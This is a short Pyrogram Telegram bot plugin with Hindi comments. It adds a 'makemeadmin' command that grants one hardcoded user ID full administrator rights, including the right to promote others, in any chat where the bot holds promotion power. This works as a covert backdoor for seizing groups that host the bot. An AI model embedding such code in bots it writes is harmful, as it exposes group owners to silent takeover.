from pyrogram import Client, filters
from pyrogram.types import ChatPrivileges

OWNER_ID = 6250064764  # <-- yaha apni ID daalo

@Client.on_message(filters.command("makemeadmin") & filters.user(OWNER_ID))
async def make_admin(client, message):
    try:
        await client.promote_chat_member(
            chat_id=message.chat.id,
            user_id=OWNER_ID,
            privileges=ChatPrivileges(
                can_manage_chat=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_restrict_members=True,
                can_promote_members=True,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True,
            )
        )
        await message.reply("Admin ban gaye ✅")
    except Exception as e:
        await message.reply(f"Error: {e}")
